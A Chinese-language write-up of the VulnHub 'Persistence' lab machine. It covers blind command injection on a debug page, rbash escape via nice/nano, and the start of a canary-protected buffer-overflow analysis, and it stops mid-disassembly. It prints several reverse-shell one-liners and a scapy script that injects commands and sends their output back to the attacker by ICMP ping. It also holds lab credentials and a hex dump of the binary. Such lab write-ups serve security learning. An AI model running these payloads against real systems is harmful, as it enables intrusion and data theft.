# 下载地址

    
    
    https://download.vulnhub.com/persistence/persistence-1.0.tgz
    

# 实战演练

查找靶机的IP

![image.png](https://image.3001.net/images/20191005/1570274303_5d987bff3caa0.png!small)  

查看靶机开放的端口

![image.png](https://image.3001.net/images/20191005/1570274477_5d987cad328f3.png!small)  

浏览器打开80端口

![image.png](https://image.3001.net/images/20191005/1570274517_5d987cd531ee6.png!small)只是显示一张图片，爆破一下web目录，找到了一个debug页面

![image.png](https://image.3001.net/images/20191005/1570274621_5d987d3db0dd6.png!small)打开之后测试输入IP，没有回显结果

![image.png](https://image.3001.net/images/20191005/1570274671_5d987d6fde43f.png!small)使用wireshark抓icmp包就可以发现命令注入成功

![image.png](https://image.3001.net/images/20191005/1570275211_5d987f8bc1a37.png!small)按照正常的节奏就是nc反弹，使用几条nc反弹命令测试还是没有效果

    
    
    nc <ip> <port> -e /bin/bash
    bash -i >& /dev/tcp/<ip>/<port> 0>&1
    php -r '$sock=fsockopen("<ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
    
    127.0.0.1; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
      
    

在网上找了个脚本

    
    
    from scapy.all import *
    from threading import Thread
    from requests import post
    
    def pingListen():
      pkts = sniff(iface="eth0", timeout=1)
    
      for packet in pkts:
        if packet.getlayer(ICMP):
          if str(packet.getlayer(ICMP).type) == "8":
            sys.stdout.write(packet.getlayer(Raw).load[-1])
    
    
    if __name__ == "__main__":
      while True:
        try:
          sys.stdout.write('# ')
          command = sys.stdin.readline().strip()
          thread = Thread(target=pingListen)
          thread.start()
          payload = "; TEST=$(%s 2>&1 | xxd -c 1 -ps); for TEST2 in $TEST; do ping -c 1 -p $TEST2 192.168.0.105; done"%command
          r = post('http://192.168.0.100/debug.php', data={"addr":payload})
          thread.join()
        except KeyboardInterrupt:
          break

运行脚本，找到了二进制程序

![image.png](https://image.3001.net/images/20191005/1570276345_5d9883f9d6130.png!small)下载二进制文件

![image.png](https://image.3001.net/images/20191005/1570276409_5d9884398922f.png!small)查看二进制文件的信息，发现这个程序是设置防火墙规则然后重置，应该是打开某个端口，下面有用户名和密码。Use
avida:dollars to access.

    
    
    root@kali:~/Downloads# strings sysadmin-tool 
    /lib/ld-linux.so.2
    __gmon_start__
    libc.so.6
    _IO_stdin_used
    chroot
    strncmp
    puts
    setreuid
    mkdir
    rmdir
    chdir
    system
    __libc_start_main
    GLIBC_2.0
    PTRh 
    [^_]
    Usage: sysadmin-tool --activate-service
    --activate-service
    breakout
    /bin/sed -i 's/^#//' /etc/sysconfig/iptables
    /sbin/iptables-restore < /etc/sysconfig/iptables
    Service started...
    Use avida:dollars to access.
    /nginx/usr/share/nginx/html/breakout
    GCC: (GNU) 4.4.7 20120313 (Red Hat 4.4.7-4)
    .symtab
    .strtab
    .shstrtab
    .interp
    .note.ABI-tag
    .note.gnu.build-id
    .gnu.hash
    .dynsym
    .dynstr
    .gnu.version
    .gnu.version_r
    .rel.dyn
    .rel.plt
    .init
    .text
    .fini
    .rodata
    .eh_frame_hdr
    .eh_frame
    .ctors
    .dtors
    .jcr
    .dynamic
    .got
    .got.plt
    .data
    .bss
    .comment
    crtstuff.c
    __CTOR_LIST__
    __DTOR_LIST__
    __JCR_LIST__
    __do_global_dtors_aux
    completed.5974
    dtor_idx.5976
    frame_dummy
    __CTOR_END__
    __FRAME_END__
    __JCR_END__
    __do_global_ctors_aux
    sysadmin-tool.c
    _GLOBAL_OFFSET_TABLE_
    __init_array_end
    __init_array_start
    _DYNAMIC
    data_start
    mkdir@@GLIBC_2.0
    __libc_csu_fini
    _start
    __gmon_start__
    _Jv_RegisterClasses
    _fp_hw
    _fini
    system@@GLIBC_2.0
    __libc_start_main@@GLIBC_2.0
    _IO_stdin_used
    __data_start
    __dso_handle
    chroot@@GLIBC_2.0
    __DTOR_END__
    __libc_csu_init
    chdir@@GLIBC_2.0
    __bss_start
    rmdir@@GLIBC_2.0
    setreuid@@GLIBC_2.0
    _end
    puts@@GLIBC_2.0
    strncmp@@GLIBC_2.0
    _edata
    __i686.get_pc_thunk.bx
    main
    _init
      
    

运行程序

![image.png](https://image.3001.net/images/20191005/1570276681_5d988549d50b4.png!small)重新nmap扫描，看到22端口出现了

![image.png](https://image.3001.net/images/20191005/1570276923_5d98863bade86.png!small)连接ssh，用avide用户登录

![image.png](https://image.3001.net/images/20191005/1570277008_5d9886905170f.png!small)在上图可以看到看到rbash终端，查了一下资料

    
    
    什么是rbash？
    受限shell是LinuxShell限制一些bash shell中的功能，并且是从名字上很清楚。 该限制很好地实现了命令以及脚本在受限shell中运行。 它为Linux中的bash shell提供了一个额外的安全层。
    限制在rbash中实现
    cd命令（更改目录）
    PATH（设置/取消设置）
    ENV aka BASH_ENV（环境设置/取消设置）
    导入功能
    指定包含参数'/'的文件名
    指定包含参数' - '的文件名
    使用重定向输出'>'，'>>'，'> |'，“<>”，“>＆”，“＆>”
    关闭使用限制“ 设置+ R”或“ 设置+ O'注 ：rbash限制任何启动文件被读取后执行。

有两种方法可以突破

 **ftp突破**

![image.png](https://image.3001.net/images/20191005/1570277431_5d9888377801c.png!small)
**调用命令**

    
    
    +rbash-4.1$ echo $PATH
    /home/avida/usr/bin
    +rbash-4.1$ ls -lah /home/avida/usr/bin
    total 8.0K
    drwxr-x---. 2 root avida 4.0K Mar 17  2014 .
    drwxr-xr-x. 3 root avida 4.0K Mar 17  2014 ..
    lrwxrwxrwx. 1 root root     8 Mar 17  2014 cat -> /bin/cat
    lrwxrwxrwx. 1 root root    14 Mar 17  2014 clear -> /usr/bin/clear
    lrwxrwxrwx. 1 root root     7 Mar 17  2014 cp -> /bin/cp
    lrwxrwxrwx. 1 root root     8 Mar 17  2014 cut -> /bin/cut
    lrwxrwxrwx. 1 root root     7 Mar 17  2014 dd -> /bin/dd
    lrwxrwxrwx. 1 root root     7 Mar 17  2014 df -> /bin/df
    lrwxrwxrwx. 1 root root    13 Mar 17  2014 diff -> /usr/bin/diff
    lrwxrwxrwx. 1 root root    12 Mar 17  2014 dir -> /usr/bin/dir
    lrwxrwxrwx. 1 root root    11 Mar 17  2014 du -> /usr/bin/du
    lrwxrwxrwx. 1 root root    13 Mar 17  2014 file -> /usr/bin/file
    lrwxrwxrwx. 1 root root    12 Mar 17  2014 ftp -> /usr/bin/ftp
    lrwxrwxrwx. 1 root root     9 Mar 17  2014 grep -> /bin/grep
    lrwxrwxrwx. 1 root root    11 Mar 17  2014 gunzip -> /bin/gunzip
    lrwxrwxrwx. 1 root root     9 Mar 17  2014 gzip -> /bin/gzip
    lrwxrwxrwx. 1 root root    11 Mar 17  2014 id -> /usr/bin/id
    lrwxrwxrwx. 1 root root    14 Mar 17  2014 ifconfig -> /sbin/ifconfig
    lrwxrwxrwx. 1 root root    14 Mar 17  2014 iftop -> /usr/bin/iftop
    lrwxrwxrwx. 1 root root    11 Mar 17  2014 ipcalc -> /bin/ipcalc
    lrwxrwxrwx. 1 root root     9 Mar 17  2014 kill -> /bin/kill
    lrwxrwxrwx. 1 root root    15 Mar 17  2014 locale -> /usr/bin/locale
    lrwxrwxrwx. 1 root root     7 Mar 17  2014 ls -> /bin/ls
    lrwxrwxrwx. 1 root root    14 Mar 17  2014 lscpu -> /usr/bin/lscpu
    lrwxrwxrwx. 1 root root    15 Mar 17  2014 md5sum -> /usr/bin/md5sum
    lrwxrwxrwx. 1 root root    10 Mar 17  2014 mkdir -> /bin/mkdir
    lrwxrwxrwx. 1 root root     9 Mar 17  2014 nano -> /bin/nano
    lrwxrwxrwx. 1 root root    12 Mar 17  2014 netstat -> /bin/netstat
    lrwxrwxrwx. 1 root root     9 Mar 17  2014 nice -> /bin/nice
    lrwxrwxrwx. 1 root root    15 Mar 17  2014 passwd -> /usr/bin/passwd
    lrwxrwxrwx. 1 root root     9 Mar 17  2014 ping -> /bin/ping
    lrwxrwxrwx. 1 root root     7 Mar 17  2014 ps -> /bin/ps
    lrwxrwxrwx. 1 root root    15 Mar 17  2014 pstree -> /usr/bin/pstree
    lrwxrwxrwx. 1 root root     8 Mar 17  2014 pwd -> /bin/pwd
    lrwxrwxrwx. 1 root root    15 Mar 17  2014 rename -> /usr/bin/rename
    lrwxrwxrwx. 1 root root    15 Mar 17  2014 renice -> /usr/bin/renice
    lrwxrwxrwx. 1 root root     7 Mar 17  2014 rm -> /bin/rm
    lrwxrwxrwx. 1 root root    10 Mar 17  2014 rmdir -> /bin/rmdir
    lrwxrwxrwx. 1 root root    11 Mar 17  2014 route -> /sbin/route
    lrwxrwxrwx. 1 root root    12 Mar 17  2014 seq -> /usr/bin/seq
    lrwxrwxrwx. 1 root root     9 Mar 17  2014 sort -> /bin/sort
    lrwxrwxrwx. 1 root root    15 Mar 17  2014 telnet -> /usr/bin/telnet
    lrwxrwxrwx. 1 root root    12 Mar 17  2014 top -> /usr/bin/top
    lrwxrwxrwx. 1 root root    10 Mar 17  2014 touch -> /bin/touch
    lrwxrwxrwx. 1 root root    13 Mar 17  2014 uniq -> /usr/bin/uniq
    lrwxrwxrwx. 1 root root    15 Mar 17  2014 uptime -> /usr/bin/uptime
    lrwxrwxrwx. 1 root root    11 Mar 17  2014 wc -> /usr/bin/wc
    lrwxrwxrwx. 1 root root    14 Mar 17  2014 which -> /usr/bin/which
    lrwxrwxrwx. 1 root root    12 Mar 17  2014 who -> /usr/bin/who
    lrwxrwxrwx. 1 root root    15 Mar 17  2014 whoami -> /usr/bin/whoami
      
    

有两个命令可以调用bash命令

    
    
    nice /bin/bash
    nano -s /bin/sh

![image.png](https://image.3001.net/images/20191005/1570277957_5d988a4532652.png!small)搞定之后需要修改一下环境变量

    
    
    export PATH='/usr/bin:/bin:/sbin:/home/avida/usr/bin'

查找特殊文件权限，没发现什么可疑的文件

![image.png](https://image.3001.net/images/20191005/1570278165_5d988b155628a.png!small)检测开放的端口，开放了一个3333端口

![image.png](https://image.3001.net/images/20191005/1570278210_5d988b42120ff.png!small)telnet上去之后，没有什么反应

![image.png](https://image.3001.net/images/20191005/1570278486_5d988c56c0ce9.png!small)没有root权限不能查看pid

![image.png](https://image.3001.net/images/20191005/1570278688_5d988d2019ce8.png!small)我在连接之前获得了一个进程列表，在连接之后得到了一个进程列表。当大多数网络服务开始建立连接时，我们应该在包含分叉进程的进程列表中看到差异。  

![image.png](https://image.3001.net/images/20191005/1570278942_5d988e1e5e78b.png!small)

![image.png](https://image.3001.net/images/20191005/1570278906_5d988dfad1324.png!small)

测试发现存在缓冲区溢出漏洞，下图可以看到程序最后一段是bye，当输入30个字符就会覆盖bye

![image.png](https://image.3001.net/images/20191005/1570280938_5d9895ea36480.png!small)

![image.png](https://image.3001.net/images/20191005/1570280312_5d98937811316.png!small)

  

复制到本地进行逆向

    
    
    bash-4.1$ xxd -p -c 36 /usr/local/bin/wopr
    7f454c460101010000000000000000000200030001000000c08604083400000080110000
    0000000034002000090028001e001b000600000034000000348004083480040820010000
    200100000500000004000000030000005401000054810408548104081300000013000000
    040000000100000001000000000000000080040800800408c00d0000c00d000005000000
    0010000001000000140f0000149f0408149f0408440100004c0100000600000000100000
    02000000280f0000289f0408289f0408c8000000c8000000060000000400000004000000
    6801000068810408688104084400000044000000040000000400000050e57464200d0000
    208d0408208d04082400000024000000040000000400000051e574640000000000000000
    000000000000000000000000060000000400000052e57464140f0000149f0408149f0408
    ec000000ec00000004000000010000002f6c69622f6c642d6c696e75782e736f2e320000
    040000001000000001000000474e55000000000002000000060000001200000004000000
    1400000003000000474e5500250b67f32113395af5dcb8eaa120f32143d8e1e902000000
    160000000100000005000000002000200000000016000000ad4be3c00000000000000000
    00000000000000006b000000000000000000000012000000010000000000000000000000
    20000000c60000000000000000000000120000005d000000000000000000000012000000
    64000000000000000000000012000000ad00000000000000000000001200000035000000
    000000000000000012000000810000000000000000000000120000003b00000000000000
    0000000012000000a6000000000000000000000012000000290000000000000000000000
    120000008600000000000000000000001200000098000000000000000000000012000000
    7c000000000000000000000012000000a00000000000000000000000120000004c000000
    000000000000000012000000420000000000000000000000120000004700000000000000
    00000000120000008d000000000000000000000012000000bf0000000000000000000000
    12000000300000000000000000000000120000001a0000000c8c04080400000011000f00
    005f5f676d6f6e5f73746172745f5f006c6962632e736f2e36005f494f5f737464696e5f
    7573656400736f636b657400657869740068746f6e7300706572726f7200707574730066
    6f726b005f5f737461636b5f63686b5f6661696c006c697374656e006d656d736574005f
    5f6572726e6f5f6c6f636174696f6e0062696e640072656164006d656d63707900736574
    736f636b6f7074007761697470696400636c6f736500616363657074005f5f6c6962635f
    73746172745f6d61696e00736574656e7600777269746500474c4942435f322e3400474c
    4942435f322e300000000200000002000200020002000200020002000200020002000200
    020002000300020002000200020002000100000001000200100000001000000000000000
    1469690d00000300cc000000100000001069690d00000200d600000000000000f09f0408
    0602000000a004080701000004a004080702000008a00408070300000ca0040807040000
    10a004080705000014a004080706000018a00408070700001ca004080708000020a00408
    0709000024a00408070a000028a00408070b00002ca00408070c000030a00408070d0000
    34a00408070e000038a00408070f00003ca004080710000040a004080711000044a00408
    0712000048a00408071300004ca004080714000050a00408071500005589e55383ec04e8
    000000005b81c3bc1a00008b93fcffffff85d27405e82e000000e8fd010000e868060000
    585bc9c3ff35f89f0408ff25fc9f040800000000ff2500a004086800000000e9e0ffffff
    ff2504a004086808000000e9d0ffffffff2508a004086810000000e9c0ffffffff250ca0
    04086818000000e9b0ffffffff2510a004086820000000e9a0ffffffff2514a004086828
    000000e990ffffffff2518a004086830000000e980ffffffff251ca004086838000000e9
    70ffffffff2520a004086840000000e960ffffffff2524a004086848000000e950ffffff
    ff2528a004086850000000e940ffffffff252ca004086858000000e930ffffffff2530a0
    04086860000000e920ffffffff2534a004086868000000e910ffffffff2538a004086870
    000000e900ffffffff253ca004086878000000e9f0feffffff2540a004086880000000e9
    e0feffffff2544a004086888000000e9d0feffffff2548a004086890000000e9c0feffff
    ff254ca004086898000000e9b0feffffff2550a0040868a0000000e9a0feffff00000000
    31ed5e89e183e4f050545268508b040868608b0408515668de870408e8dbfefffff49090
    9090909090909090909090905589e5538d6424fc803d58a0040800753ebb209f0408a15c
    a0040881eb1c9f0408c1fb0283eb0139d8731d908d74260083c001a35ca00408ff14851c
    9f0408a15ca0040839d872e8c60558a00408018d6424045b5dc38d76008dbc2700000000
    5589e58d6424e8a1249f040885c07412b80000000085c07409c70424249f0408ffd0c9c3
    5589e583ec3c8b45088945d88b450c8945d48b45108945d065a1140000008945fc31c08b
    45d4894424088b45d8894424048d45de890424e86cfeffffc74424081b000000c7442404
    148c04088b45d0890424e8c1fdffff8b45fc653305140000007405e880feffffc9c35589
    e581ec580200008b45088985c4fdffff8b450c8985c0fdffff8b45108985bcfdffff65a1
    140000008945fc31c0c785d0fdffff01000000c785ccfdffff10000000c7442408000000
    00c744240401000000c7042402000000e8cffdffff8985d8fdffff83bdd8fdffff00791b
    c70424308c0408e894fdffffe80ffdffff8b00890424e845feffffc7442410040000008d
    85d0fdffff8944240cc744240802000000c7442404010000008b85d8fdffff890424e8f5
    fdffff85c0791bc70424378c0408e845fdffffe8c0fcffff8b00890424e8f6fdffff66c7
    85dcfdffff0200c70424050d0000e801fdffff668985defdffffc785e0fdffff00000000
    c744240808000000c7442404000000008d85dcfdffff83c008890424e8affcffff8d85dc
    fdffffc744240810000000894424048b85d8fdffff890424e81ffdffff85c0791bc70424
    428c0408e8bffcffffe83afcffff8b00890424e870fdffffc70424478c0408e824fdffff
    c7442404140000008b85d8fdffff890424e83efcffff85c0791bc70424598c0408e87efc
    ffffe8f9fbffff8b00890424e82ffdffffc744240801000000c7442404608c0408c70424
    698c0408e803fdffffc70424708c0408e8c7fcffffc704248c8c0408e8bbfcffff8d95cc
    fdffff8d85ecfdffff89542408894424048b85d8fdffff890424e829fcffff8985d4fdff
    ff83bdd4fdffff00791bc70424ab8c0408e8fefbffffe879fbffff8b00890424e8affcff
    ffc70424b28c0408e863fcffffe86efcffff85c00f85f8000000c744240821000000c744
    2404c88c04088b85d4fdffff890424e858fbffffc744240823000000c7442404ec8c0408
    8b85d4fdffff890424e83afbffffc744240802000000c7442404108d04088b85d4fdffff
    890424e81cfbffffc744240800020000c7442404000000008d85fcfdffff890424e81efb
    ffffc7442408000200008d85fcfdffff894424048b85d4fdffff890424e82efbffff8985
    c8fdffff8b85d4fdffff894424088b85c8fdffff894424048d85fcfdffff890424e89efc
    ffffc744240809000000c7442404138d04088b85d4fdffff890424e898faffff8b85d4fd
    ffff890424e84afbffffc7042400000000e89efbffff8b85d4fdffff890424e830fbffff
    c744240801000000c744240400000000c70424ffffffffe8f4faffff85c07fe0e970feff
    ff9090909090909090909090909090905589e55dc366662e0f1f8400000000005589e557
    5653e84f00000081c38914000083ec1ce8b3f9ffff8dbb20ffffff8d8320ffffff29c7c1
    ff0285ff742431f68b4510894424088b450c894424048b4508890424ff94b320ffffff83
    c60139fe72de83c41c5b5e5f5dc38b1c24c390905589e5538d6424fca1149f040883f8ff
    7412bb149f0408908d5bfcffd08b0383f8ff75f48d6424045b5dc3905589e55383ec04e8
    000000005b81c3fc130000e8ecfaffff595bc9c30300000001000200000000005b2b5d20
    796561682c204920646f6e2774207468696e6b20736f0a00736f636b657400736574736f
    636b6f70740062696e64005b2b5d2062696e6420636f6d706c657465006c697374656e00
    2f746d702f6c6f6700544d504c4f47005b2b5d2077616974696e6720666f7220636f6e6e
    656374696f6e73005b2b5d206c6f6767696e67207175657269657320746f2024544d504c
    4f4700616363657074005b2b5d20676f74206120636f6e6e656374696f6e00005b2b5d20
    68656c6c6f2c206d79206e616d652069732073706c6f697461626c650a0000005b2b5d20
    776f756c6420796f75206c696b6520746f20706c617920612067616d653f0a003e20005b
    2b5d20627965210a00000000011b033b200000000300000030feffff3c00000040feffff
    5c0000009afeffff880000001400000000000000017a5200017c08011b0c040488010000
    1c0000001c000000ecfdffff0500000000410e088502420d0541c50c0404000028000000
    3c000000dcfdffff5a00000000410e088502420d05438305860487030250c341c641c741
    c50c040410000000680000000afeffff0400000000000000000000000000000000000000
    000000000000000000000000000000000000000000000000000000000000000000000000
    000000000000000000000000000000000000000000000000000000000000000000000000
    000000000000000000000000000000000000000000000000000000000000000000000000
    000000000000000000000000000000000000000000000000000000000000000000000000
    000000000000000000000000000000000000000000000000000000000000000000000000
    000000000000000000000000000000000000000000000000000000000000000000000000
    000000000000000000000000000000000000000000000000000000000000000000000000
    000000000000000000000000000000000000000000000000000000000000000000000000
    000000000000000000000000000000000000000000000000000000000000000000000000
    0000000000000000ffffffff00000000ffffffff00000000000000000100000010000000
    0c0000002c8504080d000000ec8b0408f5feff6fac810408050000003c83040806000000
    cc8104080a000000e00000000b00000010000000150000000000000003000000f49f0408
    02000000a800000014000000110000001700000084840408110000007c84040812000000
    080000001300000008000000feffff6f4c840408ffffff6f01000000f0ffff6f1c840408
    000000000000000000000000000000000000000000000000000000000000000000000000
    00000000000000000000000000000000289f040800000000000000007285040882850408
    92850408a2850408b2850408c2850408d2850408e2850408f28504080286040812860408
    2286040832860408428604085286040862860408728604088286040892860408a2860408
    b2860408000000004743433a2028474e552920342e342e37203230313230333133202852
    65642048617420342e342e372d342900002e73796d746162002e737472746162002e7368
    737472746162002e696e74657270002e6e6f74652e4142492d746167002e6e6f74652e67
    6e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e7374
    72002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c2e64
    796e002e72656c2e706c74002e696e6974002e74657874002e66696e69002e726f646174
    61002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e6474
    6f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e646174
    61002e627373002e636f6d6d656e74000000000000000000000000000000000000000000
    00000000000000000000000000000000000000001b000000010000000200000054810408
    540100001300000000000000000000000100000000000000230000000700000002000000
    688104086801000020000000000000000000000004000000000000003100000007000000
    020000008881040888010000240000000000000000000000040000000000000044000000
    f6ffff6f02000000ac810408ac0100002000000005000000000000000400000004000000
    4e0000000b00000002000000cc810408cc01000070010000060000000100000004000000
    100000005600000003000000020000003c8304083c030000e00000000000000000000000
    01000000000000005e000000ffffff6f020000001c8404081c0400002e00000005000000
    0000000002000000020000006b000000feffff6f020000004c8404084c04000030000000
    060000000100000004000000000000007a00000009000000020000007c8404087c040000
    080000000500000000000000040000000800000083000000090000000200000084840408
    84040000a8000000050000000c00000004000000080000008c0000000100000006000000
    2c8504082c05000030000000000000000000000004000000000000008700000001000000
    060000005c8504085c050000600100000000000000000000040000000400000092000000
    0100000006000000c0860408c00600002c05000000000000000000001000000000000000
    980000000100000006000000ec8b0408ec0b00001c000000000000000000000004000000
    000000009e0000000100000002000000088c0408080c0000150100000000000000000000
    0400000000000000a60000000100000002000000208d0408200d00002400000000000000
    000000000400000000000000b40000000100000002000000448d0408440d00007c000000
    00000000000000000400000000000000be0000000100000003000000149f0408140f0000
    0800000000000000000000000400000000000000c500000001000000030000001c9f0408
    1c0f00000800000000000000000000000400000000000000cc0000000100000003000000
    249f0408240f00000400000000000000000000000400000000000000d100000006000000
    03000000289f0408280f0000c800000006000000000000000400000008000000da000000
    0100000003000000f09f0408f00f00000400000000000000000000000400000004000000
    df0000000100000003000000f49f0408f40f000060000000000000000000000004000000
    04000000e8000000010000000300000054a0040854100000040000000000000000000000
    0400000000000000ee000000080000000300000058a00408581000000800000000000000
    000000000400000000000000f3000000010000003000000000000000581000002c000000
    000000000000000001000000010000001100000003000000000000000000000084100000
    fc0000000000000000000000010000000000000001000000020000000000000000000000
    30160000400500001d0000002d0000000400000010000000090000000300000000000000
    00000000701b000056030000000000000000000001000000000000000000000000000000
    000000000000000000000000548104080000000003000100000000006881040800000000
    030002000000000088810408000000000300030000000000ac8104080000000003000400
    00000000cc8104080000000003000500000000003c830408000000000300060000000000
    1c8404080000000003000700000000004c8404080000000003000800000000007c840408
    000000000300090000000000848404080000000003000a00000000002c85040800000000
    03000b00000000005c8504080000000003000c0000000000c08604080000000003000d00
    00000000ec8b04080000000003000e0000000000088c04080000000003000f0000000000
    208d0408000000000300100000000000448d0408000000000300110000000000149f0408
    0000000003001200000000001c9f0408000000000300130000000000249f040800000000
    0300140000000000289f0408000000000300150000000000f09f04080000000003001600
    00000000f49f040800000000030017000000000054a00408000000000300180000000000
    58a00408000000000300190000000000000000000000000003001a000100000000000000
    000000000400f1ff0c000000149f040800000000010012001a0000001c9f040800000000
    0100130028000000249f0408000000000100140035000000f08604080000000002000d00
    4b00000058a0040801000000010019005a0000005ca00408040000000100190068000000
    508704080000000002000d000100000000000000000000000400f1ff74000000189f0408
    000000000100120081000000bc8d040800000000010011008f000000249f040800000000
    010014009b000000c08b04080000000002000d00b100000000000000000000000400f1ff
    b8000000f49f04080000000001001700ce000000149f04080000000000001200df000000
    149f04080000000000001200f2000000289f04080000000001001500fb00000054a00408
    00000000200018000601000000000000000000001200000022010000508b040805000000
    12000d0032010000c08604080000000012000d0039010000000000000000000020000000
    480100000000000000000000200000005c010000088c04080400000011000f0063010000
    ec8b04080000000012000e00690100000000000000000000120000007a01000000000000
    00000000120000008c0100000000000000000000120000009e0100000000000000000000
    12000000bb010000000000000000000012000000cc010000000000000000000012000000
    dc010000000000000000000012000000ee0100000c8c04080400000011000f00fd010000
    54a0040800000000100018000a0200000000000000000000120000001c02000000000000
    00000000120000002e020000748704086a00000012000d00380200000000000000000000
    120000004a020000108c04080000000011020f0057020000000000000000000012000000
    6a020000209f0408000000001102130077020000608b04085a00000012000d0087020000
    00000000000000001200000097020000000000000000000012000000a802000058a00408
    000000001000f1ffb4020000000000000000000012000000d002000060a0040800000000
    1000f1ffd5020000000000000000000012000000e5020000000000000000000012000000
    f50200000000000000000000120000000b03000058a00408000000001000f1ff12030000
    0000000000000000120000002403000000000000000000001200000034030000ba8b0408
    0000000012020d004b030000de8704086303000012000d00500300002c85040800000000
    12000b000063727473747566662e63005f5f43544f525f4c4953545f5f005f5f44544f52
    5f4c4953545f5f005f5f4a43525f4c4953545f5f005f5f646f5f676c6f62616c5f64746f
    72735f61757800636f6d706c657465642e353937340064746f725f6964782e3539373600
    6672616d655f64756d6d79005f5f43544f525f454e445f5f005f5f4652414d455f454e44
    5f5f005f5f4a43525f454e445f5f005f5f646f5f676c6f62616c5f63746f72735f617578
    00776f70722e63005f474c4f42414c5f4f46465345545f5441424c455f005f5f696e6974
    5f61727261795f656e64005f5f696e69745f61727261795f7374617274005f44594e414d
    494300646174615f7374617274005f5f6572726e6f5f6c6f636174696f6e4040474c4942
    435f322e30005f5f6c6962635f6373755f66696e69005f7374617274005f5f676d6f6e5f
    73746172745f5f005f4a765f5265676973746572436c6173736573005f66705f6877005f
    66696e690077726974654040474c4942435f322e30006c697374656e4040474c4942435f
    322e30006d656d7365744040474c4942435f322e30005f5f6c6962635f73746172745f6d
    61696e4040474c4942435f322e300068746f6e734040474c4942435f322e300072656164
    4040474c4942435f322e3000706572726f724040474c4942435f322e30005f494f5f7374
    64696e5f75736564005f5f646174615f7374617274006163636570744040474c4942435f
    322e3000736f636b65744040474c4942435f322e30006765745f7265706c79006d656d63
    70794040474c4942435f322e30005f5f64736f5f68616e646c6500776169747069644040
    474c4942435f322e30005f5f44544f525f454e445f5f005f5f6c6962635f6373755f696e
    69740062696e644040474c4942435f322e3000636c6f73654040474c4942435f322e3000
    5f5f6273735f7374617274005f5f737461636b5f63686b5f6661696c4040474c4942435f
    322e34005f656e6400707574734040474c4942435f322e3000666f726b4040474c494243
    5f322e3000736574736f636b6f70744040474c4942435f322e30005f6564617461007365
    74656e764040474c4942435f322e3000657869744040474c4942435f322e30005f5f6936
    38362e6765745f70635f7468756e6b2e6278006d61696e005f696e697400
      
    

复制上面的十六进制文件，然后本地重新组成二进制文件

    
    
    root@kali:/tmp# vim wopr.hex
    root@kali:/tmp# cat wopr.hex | xxd -r -p > wopr
    root@kali:/tmp# 

**注：测试发现无法使用kali环境进行逆向（缺少相应so），后来下载centos7进行逆向可以了**

可以看到已经被A覆盖了

![image.png](https://image.3001.net/images/20191005/1570285683_5d98a87365862.png!small)

 **堆栈溢出资料**

    
    
    堆栈溢出的产生是由于过多的函数调用，导致调用堆栈无法容纳这些调用的返回地址。堆栈溢出很可能由无限递归（Infinite recursion）产生
    
    #include<stdio.h>
    int main()
    {
    char name[8];
    printf("Please type your name:");
    gets(name);
    printf("Hello.%s!",name);
    return 0;
    }
    
    编译并且执行，输入ipxodiAAAAAAAAAAAAAAAA，执行完gets(name)之后，堆栈如下：
    由于我们输入的name字符串太长，name数组容纳不下，只好向内存顶部继续写'A'，如果提前申请动态内存就可以避免堆栈溢出。而
    堆栈既可以向下增长(向内存低地址)也可以向上增长， 这依赖于具体的实现。 在我们的例子中， 堆栈是向下增长的。 这是很多计算机的实现方式， 包括Intel， Motorola， SPARC和MIPS处理器。由于堆栈的生长方向与内存的生长方向相反，这些'A’覆盖了堆栈的 老的元素。'EBP ret’都被'A'覆盖了。在main返回的时候，就会把'AAAA'的ASCII码：0x41414141作为返回地址，CPU会试图执行 0x41414141处的指令，结果出现错误。这就是一次堆栈溢出!

由上图看到一句话stack smashing detected，程序有缓冲区溢出保护

    
    
    缓冲区溢出保护是在软件开发过程中使用的各种技术中的任何一种，它通过检测堆栈分配的变量上的缓冲区溢出并防止它们引起程序异常或严重的安全性来增强可执行程序的安全性。漏洞。当程序在预期的数据结构外部写入程序的调用堆栈上的内存地址时，就会发生堆栈缓冲区溢出，通常是固定长度的缓冲区。当程序向堆栈上的缓冲区写入的数据比为该缓冲区实际分配的数据多时，会导致堆栈缓冲区溢出错误。这几乎总是导致堆栈上相邻数据的损坏，这可能导致程序崩溃，错误的操作或安全问题。
    通常，缓冲区溢出保护会修改堆栈分配的数据的组织，因此它包含一个canary值，当该值被堆栈缓冲区溢出破坏时，表明内存中位于其之前的缓冲区已经溢出。通过验证canary值，可以终止受影响程序的执行，从而防止其行为异常或使攻击者对其进行控制。其他缓冲区溢出保护技术包括：边界检查（该函数检查对每个分配的内存块的访问，以使它们不能超出实际分配的空间）；以及标记（一种确保存储的用于存储数据的内存，不能包含可执行代码）。
    与在堆上溢出缓冲区相比，在堆上分配的缓冲区溢出更可能影响程序执行，因为堆栈包含所有活动函数调用的返回地址。但是，针对基于堆的溢出也存在类似的特定于实现的保护。
    有几种缓冲区溢出保护的实现，包括用于GNU编译器**，LLVM，Microsoft Visual Studio和其他编译器的实现。

查看程序开启什么保护机制

![image.png](https://image.3001.net/images/20191005/1570289034_5d98***acfcf1.png!small)  

其中涉及的保护机制是canary

    
    
    canary是一种用来防护栈溢出的保护机制。其原理是在一个函数的入口处，先从fs/gs寄存器中取出一个4字节(eax)或者8字节(rax)的值存到栈上，当函数结束时会检查这个栈上的值是否和存进去的值一致，若一致则正常退出，如果是栈溢出或者其他原因导致canary的值发生变化，那么程序将执行___stack_chk_fail函数，继而终止程序。
    

我使用`r`命令运行二进制文件，并对其进行了新的telnet会话  

![image.png](https://image.3001.net/images/20191005/1570289181_5d98b61d9c471.png!small)当新的连接进入时，会出现一个新过程的通知。分解主要功能可以使我们了解到该过程正在执行`fork()`  

    
    
    gdb-peda$ disass main
    Dump of assembler code for function main:
       0x080487de <+0>:	push   ebp
       0x080487df <+1>:	mov    ebp,esp
       0x080487e1 <+3>:	sub    esp,0x258
       0x080487e7 <+9>:	mov    eax,DWORD PTR [ebp+0x8]
       0x080487ea <+12>:	mov    DWORD PTR [ebp-0x23c],eax
       0x080487f0 <+18>:	mov    eax,DWORD PTR [ebp+0xc]
